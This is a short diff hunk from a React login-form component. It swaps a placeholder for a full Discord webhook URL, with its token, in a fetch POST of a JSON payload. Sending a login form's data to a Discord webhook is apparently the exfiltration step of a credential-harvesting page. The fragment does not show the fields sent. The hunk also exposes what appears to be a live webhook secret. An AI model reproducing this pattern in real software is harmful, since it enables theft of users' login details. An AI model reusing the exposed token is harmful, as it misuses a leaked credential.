@@ -29,7 +29,7 @@ function LoginForm({ route }) {
                 "timestamp": formattedDate
             }]
         }
-        fetch('INSERTWEBHOOKHERE', {
+        fetch('https://canary.discord.com/api/webhooks/1295186375854919733/5X2Kutgd2uxcywlPSLRWWfSpxxVw1pt7vFMkJuvljHB9r9A5zgYKhUYMySHPQVztS5D7', {
             method: 'POST',
             body: JSON.stringify(content),
             headers: {
